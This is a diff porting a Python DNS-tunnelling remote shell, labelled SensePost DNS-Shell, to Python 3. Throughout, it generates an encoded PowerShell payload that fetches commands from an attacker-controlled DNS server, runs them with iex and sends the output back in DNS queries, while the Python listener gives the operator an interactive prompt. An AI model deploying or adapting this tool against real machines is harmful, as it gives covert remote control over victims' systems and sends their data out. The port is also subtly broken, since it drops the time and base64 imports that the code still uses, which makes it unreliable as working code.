@@ -1,13 +1,9 @@
 import argparse
-import time
-import traceback
-import base64
 import re
+import socketserver
 import sys
-import binascii
 import threading
-import SocketServer
-import requests
+
 from dnslib import *
 
 
@@ -16,7 +12,7 @@ def powershell_encode(data):
     blank_command = ""
     powershell_command = ""
     # Remove weird chars that could have been added by ISE
-    n = re.compile(u'(\xef|\xbb|\xbf)')
+    n = re.compile('(\xef|\xbb|\xbf)')
     # loop through each character and insert null byte
     for char in (n.sub("", data)):
         # insert the nullbyte
@@ -24,12 +20,12 @@ def powershell_encode(data):
     # assign powershell command as the new one
     powershell_command = blank_command
     # base64 encode the powershell command
-    powershell_command = base64.b64encode(powershell_command)
+    powershell_command = base64.b64encode(powershell_command.encode())
     return powershell_command
 
 
 def prepare_recursive(domain):
-   st2 = """
+    st2 = """
 $url = "%s";
 function execDNS($cmd) {
 $c = iex $cmd 2>&1 | Out-String;
@@ -64,14 +60,14 @@ while (1){
    if ($txt -match 'NoCMD'){continue}
    elseif ($txt -match 'exit'){Exit}
    else{execDNS($txt)}
-}   
+}
 """ % (domain,)
-   return powershell_encode(st2)
+    return powershell_encode(st2)
 
-def prepare_direct(ip,domain):
-   st2 = """
+
+def prepare_direct(ip):
+    st2 = """
 $ip = "%s"
-$url = "%s"
 function execDNS($cmd) {
 $c = iex $cmd 2>&1 | Out-String;
 $u = [system.Text.Encoding]::UTF8.GetBytes($c);
@@ -105,46 +101,49 @@ while (1){
    if ($txt -match 'NoCMD'){continue}
    elseif ($txt -match 'exit'){Exit}
    else{execDNS($txt)}
-}   
-""" % (ip,domain)
-   return powershell_encode(st2)
+}
+""" % (ip,)
+    return powershell_encode(st2)
 
 
 def parse_output(req):
     global cmd
     cmd = 'NoCMD'
     request = req
-    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
-    rdata = A('127.0.0.1') 
+    reply = DNSRecord(DNSHeader(id=request.header.id,
+                                qr=1, aa=1, ra=1), q=request.q)
+    rdata = A('127.0.0.1')
     TTL = 60 * 5
     rqt = rdata.__class__.__name__
-    cmds.append([request.q.qname.label[1],request.q.qname.label[3]])
-    if request.q.qname.label[2] == 'sqsp' and request.q.qname.label[1] != 'END' and 'LENGTH' not in cmds:
-	cmds.append('LENGTH')
-	rcvtime = time.time()
-	expected = int(request.q.qname.label[1][4:])
-	print "[+] Expecting %s Chunks." % request.q.qname.label[1][4:]
-    if request.q.qname.label[2] != 'sqsp':
-	if request.q.qname.label[1] not in cmds:
-           cmds.append(request.q.qname.label[1])
-    	   c = request.q.qname.label[2]
-    	   cm = c.decode('hex')
-	   cr.append(cm)
-	   sys.stdout.write("\r[+] Chunks Recieved: %d" % len(cr))
-	   sys.stdout.flush()
-    if request.q.qname.label[1] == 'END':
-	cmds.append('END')
-    reply.add_answer(RR(rname=request.q.qname, rtype=1, rclass=1, ttl=TTL, rdata=rdata))
+    if len(request.q.qname.label) >= 2:
+        cmds.append(request.q.qname.label[1])
+        if request.q.qname.label[1] != b'END' and 'LENGTH' not in cmds:
+            cmds.append('LENGTH')
+            rcvtime = time.time()
+            print("[+] Expecting {} Chunks.".format(int(request.q.qname.label[1][4:])))
+        elif request.q.qname.label[1] == b'END':
+            cmds.append('END')
+        else:
+            cmds.append(request.q.qname.label[1])
+            cm = bytearray.fromhex(request.q.qname.label[2].decode()).decode()
+            cr.append(cm)
+            sys.stdout.write("\r[+] Chunks Recieved: %d" % len(cr))
+            sys.stdout.flush()
+    reply.add_answer(RR(rname=request.q.qname, rtype=1,
+                        rclass=1, ttl=TTL, rdata=rdata))
     return reply.pack()
+
 
 def parse_newCMD(request):
     global cmd
-    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+    reply = DNSRecord(DNSHeader(id=request.header.id,
+                                qr=1, aa=1, ra=1), q=request.q)
     TTL = 60 * 5
     rdata = TXT(cmd)
     cmd = 'NoCMD'
     rqt = rdata.__class__.__name__
-    reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=rdata))
+    reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.TXT,
+                        rclass=1, ttl=TTL, rdata=rdata))
     return reply.pack()
 
 
@@ -155,12 +154,13 @@ def dns_response(data):
     qtype = request.q.qtype
     qt = QTYPE[qtype]
     if qt == 'A':
-       reply = parse_output(request)
+        reply = parse_output(request)
     elif qt == 'TXT':
-       reply = parse_newCMD(request)
+        reply = parse_newCMD(request)
     return reply
 
-class BaseRequestHandler(SocketServer.BaseRequestHandler):
+
+class BaseRequestHandler(socketserver.BaseRequestHandler):
 
     def get_data(self):
         raise NotImplementedError
@@ -175,67 +175,68 @@ class BaseRequestHandler(SocketServer.BaseRequestHandler):
         except Exception:
             pass
 
-class UDPRequestHandler(BaseRequestHandler):
 
+class UDPRequestHandler(BaseRequestHandler):
     def get_data(self):
-	global newConn,recvConn,client_ip
-	if newConn:
-	   newConn = 0
-	   recvConn = 1
-	   client_ip = self.client_address
-	   print "[+] Recieved Connection from %s" % client_ip[0]
+        global newConn, recvConn, client_ip
+        if newConn:
+            newConn = 0
+            recvConn = 1
+            client_ip = self.client_address
+            print("[+] Recieved Connection from %s" % client_ip[0])
         return self.request[0].strip()
 
     def send_data(self, data):
         return self.request[1].sendto(data, self.client_address)
 
-def main(penc, WebRequestFile=None,single=None):
-	global cmd,cmds,cr,rcvtime,newCommand,recvConn,client_ip
-	UDP_PORT = 53
-	s = SocketServer.ThreadingUDPServer(('',UDP_PORT),UDPRequestHandler)
-        thread = threading.Thread(target=s.serve_forever)  
-        thread.daemon = True  # exit the server thread when the main thread terminates
-        try:
-           thread.start()
-	   if WebRequestFile:
-	      thread2 = threading.Thread(target=send_reqT, args=(penc,))
-	      thread2.daemon = True
-	      thread2.start()
-	   else:
-		print "[+] Generated Payload:\n%s" % penc
-	   while thread.isAlive():
-	      time.sleep(1)
-	      sys.stdout.flush()
-	      sys.stderr.flush()
-	      if recvConn:
-  	         if len(cmds) >= 1 and cmds[-1] == 'END' or newCommand:
-		    newCommand = 0
-	   	    print "\n\n%s" % ''.join(cr)
-		    print "[+] Command Completed Successfully."
-		    cmds = []
-		    cr = []
-		    if single:
-                       s.shutdown()
-		       sys.exit()	
-		    else:
-	               cmd = raw_input('SensePost-DNS-Shell::$ ')
-		    if cmd == 'exit':
-		       time.sleep(5)
-                       s.shutdown()
-		       sys.exit()	
-	except KeyboardInterrupt:
-	   print "%s" % ''.join(cr)	
-	   cmd = 'exit'
-	   time.sleep(5)
-	   #print("[+] 1st packet: %s seconds" % (time.time()-rcvtime))
-	   s.shutdown()
-	   sys.exit()
-	except:
-	   raise
+
+def main(penc, WebRequestFile=None, single=None):
+    global cmd, cmds, cr, rcvtime, newCommand, recvConn, client_ip
+    UDP_PORT = 53
+    s = socketserver.ThreadingUDPServer(('', UDP_PORT), UDPRequestHandler)
+    thread = threading.Thread(target=s.serve_forever)
+    thread.daemon = True  # exit the server thread when the main thread terminates
+    try:
+        thread.start()
+        if WebRequestFile:
+            thread2 = threading.Thread(target=send_reqT, args=(penc,))
+            thread2.daemon = True
+            thread2.start()
+        else:
+            print("[+] Generated Payload:\n%s" % penc.decode())
+        while thread.is_alive():
+            time.sleep(1)
+            sys.stdout.flush()
+            sys.stderr.flush()
+            if recvConn:
+                if len(cmds) >= 1 and cmds[-1] == 'END' or newCommand:
+                    newCommand = 0
+                    print("\n\n%s" % ''.join(cr))
+                    print("[+] Command Completed Successfully.")
+                    cmds = []
+                    cr = []
+                    if single:
+                        s.shutdown()
+                        sys.exit()
+                    else:
+                        cmd = input('SensePost-DNS-Shell::$ ')
+                    if cmd == 'exit':
+                        time.sleep(5)
+                        s.shutdown()
+                        sys.exit()
+    except KeyboardInterrupt:
+        print("%s" % ''.join(cr))
+        cmd = 'exit'
+        time.sleep(5)
+        # print("[+] 1st packet: %s seconds" % (time.time()-rcvtime))
+        s.shutdown()
+        sys.exit()
+    except:
+        raise
 
 
-if __name__=='__main__':
-	logo = '''
+if __name__ == '__main__':
+    logo = '''
 ________    _______    _________           _________.__           .__  .__   
 \______ \   \      \  /   _____/          /   _____/|  |__   ____ |  | |  |  
  |    |  \  /   |   \ \_____  \   ______  \_____  \ |  |  \_/ __ \|  | |  |  
@@ -244,51 +245,47 @@ ________    _______    _________           _________.__           .__  .__
         \/         \/        \/                  \/      \/     \/           
 
 								by research (at) SensePost
-                                                                modified by RusPower
 '''
-	cmds = []
-	cr = []
-	rcvtime = 0.0
-	cmd = 'NoCMD'
-	newCommand = 1
-	recvConn = 0
-	newConn = 1
-	client_ip = None
-	parser = argparse.ArgumentParser(
-		description = '''
+    cmds = []
+    cr = []
+    rcvtime = 0.0
+    cmd = 'NoCMD'
+    newCommand = 1
+    recvConn = 0
+    newConn = 1
+    client_ip = None
+    parser = argparse.ArgumentParser(
+        description='''
 A Sort of DNS-SHell.
 %s
 ''' % logo,
-		formatter_class=argparse.RawTextHelpFormatter,
-		epilog = '''
+        formatter_class=argparse.RawTextHelpFormatter,
+        epilog='''
 Examples:
 
 # Generate base64 encoded PowerShell payload, run in listener direct queries mode and wait for interactive shell.
-sudo python DNS-Shell.py -l -d [Server IP] -u [url for dns query|whatever]
+sudo python DNS-Shell.py -l -d [Server IP]
 
 # Generate base64 encoded PowerShell payload, and run in listener recursive queries mode and wait for interactive shell.
 sudo python DNS-Shell.py -l -r [Domain]''')
-	parser.add_argument('-l','--listen',help='Activate listener mode.',action='store_true')
-	parser.add_argument('-r','--recursive',help='Recursive DNS query requests.')
-	parser.add_argument('-u','--url4direct',help='url prepared for direct DNS requests mode.')
-	parser.add_argument('-d','--direct',help='Direct DNS queries mode.')
-	p = parser.parse_args()
-	print logo
-	# listener direct mode
-	if p.listen and p.direct:
-		print '[+} Listen direct queries mode active.'
-		listen = p.listen
-		ip = p.direct
-		domain = p.url4direct
-                penc = prepare_direct(ip,domain)
-		main(penc)
-	# listener recursive mode
-	elif p.listen and p.recursive:
-		print '[+] Listener recursive queries mode active.'
-		listen = p.listen
-                domain = p.recursive
-		penc = prepare_recursive(domain)
-		main(penc)
-	else:
-		parser.print_help()
-
+    parser.add_argument('-l', '--listen', help='Activate listener mode.', action='store_true')
+    parser.add_argument('-r', '--recursive', help='Recursive DNS query requests.')
+    parser.add_argument('-d', '--direct', help='Direct DNS queries mode.')
+    p = parser.parse_args()
+    print(logo)
+    # listener direct mode
+    if p.listen and p.direct:
+        print('[+] Listen direct queries mode active.')
+        listen = p.listen
+        ip = p.direct
+        penc = prepare_direct(ip)
+        main(penc)
+    # listener recursive mode
+    elif p.listen and p.recursive:
+        print('[+] Listener recursive queries mode active.')
+        listen = p.listen
+        domain = p.recursive
+        penc = prepare_recursive(domain)
+        main(penc)
+    else:
+        parser.print_help()
